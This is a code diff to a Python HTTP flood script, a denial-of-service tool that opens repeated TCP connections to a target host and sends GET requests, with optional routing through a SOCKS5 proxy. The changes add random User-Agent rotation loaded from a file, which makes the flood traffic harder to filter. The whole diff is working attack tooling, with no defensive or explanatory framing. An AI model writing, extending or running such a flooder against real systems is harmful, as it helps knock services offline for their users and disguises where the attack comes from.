@@ -14,13 +14,17 @@ def load_agents(name):
                     agentlist.append(i)
         return agentlist
 
-def send_socket(args):
+def send_socket(args, agents):
         port = args.port
         dst = socket.gethostbyname(args.host)
         try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((dst, port))
-                s.send((f"GET / HTTP/1.1\nHost: {dst}\n\n").encode('utf-8'))
+                if agents == None:
+                        s.send((f"GET / HTTP/1.1\nHost: {dst}\n\n").encode('utf-8'))
+                else:
+                        s.send((f"GET / HTTP/1.1\nHost: {dst}\nUser-Agent: {choice(agents)}\n").encode('utf-8'))
+
                 s.close()
         except Exception as s:
                 sys.exit(f'{s}, exiting gracefully')
@@ -36,10 +40,15 @@ def flood(args):
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxyhost, args.proxyport)
                 socket.socket = socks.socksocket
         print('sending packets')
-        
+
+        if args.randagent:
+                agents = load_agents('agents.txt')
+        else:
+                agents = None
+
         for i in range(0, args.packets+1):
                 tempS = time.process_time()
-                s = threading.Thread(target= send_socket(args))
+                s = threading.Thread(target= send_socket(args, agents))
                 s.start()
                 tempE = time.process_time()
                 temptimer = tempE-tempS
@@ -94,17 +103,16 @@ parser.add_argument(
         type=int
         )
 
-# parser.add_argument(
-#         '-ua', '--user-agent', '--user-agents',
-#         dest='randagent',
-#         action="store_true",
-#         help='use a random user agent',
-#         default="store_true"
-#         )
+parser.add_argument(
+        '-ua', '--user-agent', '--user-agents',
+        dest='randagent',
+        action="store_true",
+        help='use a random user agent'
+        )
 
 args = parser.parse_args()
 
-agents = load_agents('agents.txt')
+
 
 
 
